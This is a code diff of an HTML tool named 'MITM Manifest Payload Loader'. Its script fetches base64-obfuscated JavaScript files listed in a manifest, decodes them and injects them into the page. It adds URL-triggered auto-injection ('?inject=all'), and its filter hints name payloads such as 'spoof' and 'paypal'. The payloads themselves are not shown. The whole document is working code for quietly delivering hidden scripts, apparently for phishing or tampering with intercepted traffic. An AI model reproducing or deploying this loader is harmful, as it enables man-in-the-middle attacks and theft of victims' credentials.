@@ -3,116 +3,215 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>MITM Manifest Payload Loader</title>
+  <title>MITM Manifest Loader</title>
   <style>
-    body { background: #000; color: #0f0; font-family: monospace; padding: 2em; }
-    .log { margin-bottom: 1em; }
-    select { margin-bottom: 1em; min-width: 300px; }
-    button { margin-left: 1em; }
-    .success { color: #0f0; }
-    .fail { color: #f55; }
+    :root { color-scheme: dark; }
+    body { background:#000; color:#0f0; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; margin:0; padding:16px; }
+    h1 { margin:0 0 12px; font-size:16px; color:#9f9; }
+    .row { display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
+    .col { display:flex; flex-direction:column; gap:8px; }
+    label { font-size:12px; color:#bfb; }
+    input, button, select { background:#060; color:#dfd; border:1px solid #0a0; padding:8px; border-radius:6px; }
+    input::placeholder { color:#9c9; }
+    button { cursor:pointer; }
+    select { min-width:320px; height:280px; }
+    #log { margin-top:16px; border-top:1px solid #060; padding-top:12px; font-size:12px; line-height:1.5; }
+    .logline { margin:2px 0; white-space:pre-wrap; }
+    .ok { color:#9f9; }
+    .err { color:#f88; }
+    .muted { color:#9c9; }
+    .badge { background:#030; border:1px solid #060; padding:2px 6px; border-radius:999px; font-size:11px; margin-left:6px; }
+    footer { margin-top:10px; font-size:11px; color:#9c9; }
   </style>
 </head>
 <body>
-  <h2 style="color:#0f0;">MITM Manifest Payload Loader</h2>
-  <div>
-    <label for="payloads" style="color:#fff;">Choose payload(s):</label>
-    <select id="payloads" multiple size="8"></select>
-    <button id="inject">Inject Selected</button>
+  <h1>MITM Manifest Loader <span id="ver" class="badge"></span></h1>
+
+  <div class="row">
+    <div class="col" style="min-width:340px;">
+      <label for="filter">Filter</label>
+      <input id="filter" type="text" placeholder="type to filter… (e.g. spoof, paypal, headers)" autocomplete="off" />
+    </div>
+
+    <div class="col">
+      <label for="payloads">Payloads (multi-select)</label>
+      <select id="payloads" multiple></select>
+    </div>
+
+    <div class="col" style="min-width:220px;">
+      <label>Actions</label>
+      <div class="row">
+        <button id="btn-inject">Inject selected</button>
+        <button id="btn-copy">Copy inject URL</button>
+        <button id="btn-clear">Clear log</button>
+      </div>
+      <label style="margin-top:8px;">
+        <input type="checkbox" id="opt-autoload"> Auto-inject on load (selected)
+      </label>
+    </div>
   </div>
-  <div id="log"></div>
+
+  <div id="log" aria-live="polite"></div>
+  <footer>
+    Uses <code>manifest.json</code> and loads from <code>obfuscated/*.js.b64</code>. URL auto-inject: <code>?inject=a.js,b.js</code> or <code>#inject=a.js,b.js</code>. Use <code>all</code> to inject everything.
+  </footer>
+
   <script>
-    const logBox = document.getElementById("log");
-    const log = (msg, cls = "") => {
+    // ---------- basics ----------
+    const $ = (id) => document.getElementById(id);
+    const logBox = $("log");
+    const log = (msg, cls="muted") => {
       const div = document.createElement("div");
-      div.className = "log" + (cls ? " " + cls : "");
-      div.innerHTML = msg;
+      div.className = "logline " + cls;
+      const now = new Date().toISOString().split("T")[1].replace("Z","");
+      div.textContent = `[${now}] ${msg}`;
       logBox.appendChild(div);
+      div.scrollIntoView({ block: "end" });
     };
 
-    // Parse "inject" from URL (?inject=foo.js,bar.js or #inject=foo.js,bar.js)
-    function getAutoInjectTargets() {
-      const query = new URLSearchParams(location.search);
-      let inject = query.get("inject");
+    const safeJs = (s) => /^[\w.-]+\.js$/.test(s);
+    const uniq = (arr) => [...new Set(arr)];
+    const base = new URL(".", location.href);
+    const manifestURL = new URL("manifest.json", base).href;
+    const obfBase = new URL("obfuscated/", base).href;
+
+    const qs = new URLSearchParams(location.search);
+    function getAuto() {
+      let inject = qs.get("inject");
       if (!inject && location.hash.startsWith("#inject=")) {
-        inject = decodeURIComponent(location.hash.replace(/^#inject=/, ''));
+        inject = decodeURIComponent(location.hash.slice(8));
       }
-      return inject ? inject.split(",").map(x => x.trim()).filter(Boolean) : [];
+      if (!inject) return [];
+      if (inject.trim().toLowerCase() === "all") return ["__ALL__"];
+      return inject.split(",").map(s => s.trim()).filter(Boolean);
     }
 
-    // File manifest and injection
-    const manifestURL = location.href.split("/public/")[0] + "/public/manifest.json";
-    const baseURL = location.href.split("/public/")[0] + "/public/obfuscated/";
-    let allPayloads = [];
+    // ---------- state ----------
+    let manifest = [];        // array of ".js.b64" strings
+    let names = [];           // array of ".js" names (derived)
+    let filtered = [];        // current filtered set (".js")
 
-    // Safe filename check
-    const safe = s => /^[\w.-]+\.js$/.test(s);
-
-    // Inject one or more payloads by name (array)
-    async function injectPayloads(payloads) {
-      for (const target of payloads) {
-        if (!safe(target)) {
-          log(`Skipped unsafe target: ${target}`, "fail");
-          continue;
-        }
-        const b64URL = `${baseURL}${target}.b64`;
-        log(`[📦] Fetching: <code>${b64URL}</code>`);
-        try {
-          const res = await fetch(b64URL);
-          if (!res.ok) throw new Error(`HTTP ${res.status}`);
-          const encoded = await res.text();
-          const decoded = atob(encoded.trim());
-          const script = document.createElement("script");
-          script.type = "text/javascript";
-          script.textContent = decoded;
-          document.body.appendChild(script);
-          log(`[🚀] Injected: ${target}`, "success");
-        } catch (err) {
-          log(`[❌] Failed: ${target}: ${err.message}`, "fail");
-        }
-      }
+    // ---------- manifest load ----------
+    async function loadManifest() {
+      log(`Fetching manifest: ${manifestURL}`);
+      const res = await fetch(manifestURL, { cache: "no-cache" });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      const data = await res.json();
+      if (!Array.isArray(data)) throw new Error("manifest must be a JSON array");
+      manifest = data.filter(x => typeof x === "string" && x.endsWith(".js.b64"));
+      names = manifest.map(s => s.replace(/\.js\.b64$/,".js"));
+      $("ver").textContent = `files: ${names.length}`;
+      log(`Manifest loaded. ${names.length} payload(s) available.`, "ok");
     }
 
-    // Load manifest and populate dropdown
-    fetch(manifestURL)
-      .then(res => res.json())
-      .then(files => {
-        const select = document.getElementById("payloads");
-        files.forEach(f => {
-          if (typeof f === "string" && f.endsWith(".js.b64")) {
-            const name = f.replace(/\.js\.b64$/, ".js");
-            allPayloads.push(name);
-            const opt = document.createElement("option");
-            opt.value = name;
-            opt.text = name;
-            select.appendChild(opt);
-          }
-        });
-        log("Loaded manifest: " + files.length + " payloads");
+    // ---------- UI binding ----------
+    function renderOptions(list) {
+      const sel = $("payloads");
+      sel.innerHTML = "";
+      list.forEach(n => {
+        const opt = document.createElement("option");
+        opt.value = n;
+        opt.textContent = n;
+        sel.appendChild(opt);
+      });
+    }
 
-        // If URL specifies auto-inject, do it now
-        const auto = getAutoInjectTargets();
+    function applyFilter() {
+      const q = $("filter").value.trim().toLowerCase();
+      filtered = q ? names.filter(n => n.toLowerCase().includes(q)) : names.slice();
+      renderOptions(filtered);
+    }
+
+    $("filter").addEventListener("input", applyFilter);
+
+    $("btn-clear").addEventListener("click", () => {
+      logBox.innerHTML = "";
+      log("Log cleared.");
+    });
+
+    $("btn-copy").addEventListener("click", () => {
+      const sel = $("payloads");
+      const selected = Array.from(sel.selectedOptions).map(o => o.value);
+      const u = new URL(location.href);
+      if (selected.length) {
+        u.searchParams.set("inject", selected.join(","));
+        u.hash = "";
+      } else {
+        u.searchParams.delete("inject");
+      }
+      navigator.clipboard.writeText(u.toString()).then(
+        () => log("Inject URL copied to clipboard.", "ok"),
+        (e) => log("Copy failed: " + e.message, "err")
+      );
+    });
+
+    $("btn-inject").addEventListener("click", async () => {
+      const sel = $("payloads");
+      const selected = Array.from(sel.selectedOptions).map(o => o.value);
+      if (!selected.length) { log("No payload selected.", "err"); return; }
+      await injectMany(selected);
+    });
+
+    // ---------- injection ----------
+    async function injectOne(nameJs) {
+      if (!safeJs(nameJs)) { log(`Unsafe name skipped: ${nameJs}`, "err"); return; }
+      const url = obfBase + encodeURIComponent(nameJs) + ".b64";
+      log(`Fetching: ${url}`);
+      const res = await fetch(url, { cache: "no-cache" });
+      if (!res.ok) { log(`HTTP ${res.status} for ${nameJs}`, "err"); return; }
+      const encoded = (await res.text()).trim();
+      if (!encoded) { log(`Empty payload: ${nameJs}`, "err"); return; }
+      let decoded;
+      try { decoded = atob(encoded); } catch (e) { log(`Base64 decode failed: ${nameJs}`, "err"); return; }
+      const s = document.createElement("script");
+      s.type = "text/javascript";
+      s.textContent = decoded;
+      document.body.appendChild(s);
+      log(`Injected: ${nameJs}`, "ok");
+    }
+
+    async function injectMany(listJs) {
+      const queue = uniq(listJs);
+      log(`Injecting ${queue.length} payload(s)…`);
+      for (const n of queue) { /* sequential on purpose */
+        await injectOne(n);
+      }
+      log("Injection batch complete.", "ok");
+    }
+
+    // ---------- boot ----------
+    (async function boot() {
+      try {
+        await loadManifest();
+        applyFilter();
+
+        // Auto-select from URL
+        const auto = getAuto();
+        const sel = $("payloads");
+
         if (auto.length) {
-          // Optionally select them in UI
-          [...select.options].forEach(opt => {
-            if (auto.includes(opt.value)) opt.selected = true;
-          });
-          log("[🔁] Auto-injecting: " + auto.join(", "));
-          injectPayloads(auto);
+          let targets;
+          if (auto.length === 1 && auto[0] === "__ALL__") {
+            targets = names.slice();
+            // select all in UI
+            [...sel.options].forEach(o => o.selected = true);
+            log("Auto mode: ALL", "ok");
+          } else {
+            targets = auto.filter(safeJs);
+            // reflect in UI
+            [...sel.options].forEach(o => { if (targets.includes(o.value)) o.selected = true; });
+            log("Auto mode: " + targets.join(", "), "ok");
+          }
+          await injectMany(targets);
+        } else if ($("opt-autoload").checked) {
+          // inject whatever is selected initially
+          const selected = Array.from(sel.selectedOptions).map(o => o.value);
+          if (selected.length) await injectMany(selected);
         }
-      })
-      .catch(e => log("Failed to load manifest: " + e.message, "fail"));
-
-    // Manual bulk injection by dropdown
-    document.getElementById("inject").onclick = () => {
-      const select = document.getElementById("payloads");
-      const selected = Array.from(select.selectedOptions).map(o => o.value);
-      if (!selected.length) {
-        log("No payload selected", "fail");
-        return;
+      } catch (e) {
+        log("Startup failed: " + e.message, "err");
       }
-      injectPayloads(selected);
-    };
+    })();
   </script>
 </body>
 </html>
